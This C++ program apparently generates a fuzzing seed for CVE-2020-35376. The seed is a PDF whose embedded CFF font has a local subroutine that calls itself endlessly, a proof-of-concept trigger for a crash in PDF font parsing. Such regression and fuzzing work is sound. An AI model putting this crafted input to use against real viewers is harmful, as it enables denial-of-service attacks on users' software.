// Generate a deterministic PdfDocument seed for CVE-2020-35376.
//
// Usage: gen_cve_2020_35376_seed <out.txtpb|out.pb> [--binary]
#include <cstdio>
#include <fstream>
#include <string>
#include <google/protobuf/text_format.h>
#include "pdf.pb.h"

namespace {

void FillRecursiveCff(pdf_cff::CffFont* cff) {
    cff->set_font_name("CVE202035376");

    auto* notdef = cff->add_charstrings();
    notdef->add_ops()->set_op(pdf_cff::ENDCHAR);

    auto* glyph = cff->add_charstrings();
    glyph->add_ops()->set_call_local(0);
    glyph->add_ops()->set_op(pdf_cff::ENDCHAR);

    auto* subr = cff->add_local_subrs();
    subr->add_ops()->set_call_local(0);
}

pdf_proto::PdfDocument MakeSeed() {
    pdf_proto::PdfDocument doc;
    auto* page = doc.add_pages();
    page->set_width(612.0f);
    page->set_height(792.0f);
    page->add_content_streams()->set_raw_content("BT /F0 24 Tf 72 720 Td ( ) Tj ET");

    auto* font = page->add_fonts();
    font->set_subtype(pdf_proto::Font::TYPE1);
    font->set_base_font("CVE202035376");
    font->set_base_encoding(pdf_proto::Font::WINANSI);
    font->set_first_char(32);
    font->add_widths(500);

    auto* diff = font->add_differences();
    diff->set_code(32);
    diff->set_name("space");

    auto* fd = font->mutable_font_descriptor();
    fd->set_flags(4);
    fd->set_ascent(700);
    fd->set_descent(-200);
    fd->set_stem_v(80);

    auto* ff = fd->mutable_font_file();
    ff->set_key(pdf_proto::EmbeddedFontFile::FONTFILE3);
    ff->set_subtype("Type1C");
    FillRecursiveCff(ff->mutable_cff());
    return doc;
}

}  // namespace

int main(int argc, char** argv) {
    GOOGLE_PROTOBUF_VERIFY_VERSION;
    if (argc < 2 || argc > 3) {
        std::fprintf(stderr, "usage: %s <out.txtpb|out.pb> [--binary]\n", argv[0]);
        return 1;
    }

    const bool binary = argc == 3 && std::string(argv[2]) == "--binary";
    if (argc == 3 && !binary) {
        std::fprintf(stderr, "unknown option: %s\n", argv[2]);
        return 1;
    }

    const pdf_proto::PdfDocument doc = MakeSeed();
    std::string out;
    if (binary) {
        doc.SerializeToString(&out);
    } else {
        google::protobuf::TextFormat::PrintToString(doc, &out);
    }

    std::ofstream f(argv[1], std::ios::binary);
    if (!f) {
        std::fprintf(stderr, "cannot open %s\n", argv[1]);
        return 1;
    }
    f.write(out.data(), static_cast<std::streamsize>(out.size()));
    std::fprintf(stderr, "wrote %zu bytes to %s\n", out.size(), argv[1]);
    google::protobuf::ShutdownProtobufLibrary();
    return 0;
}
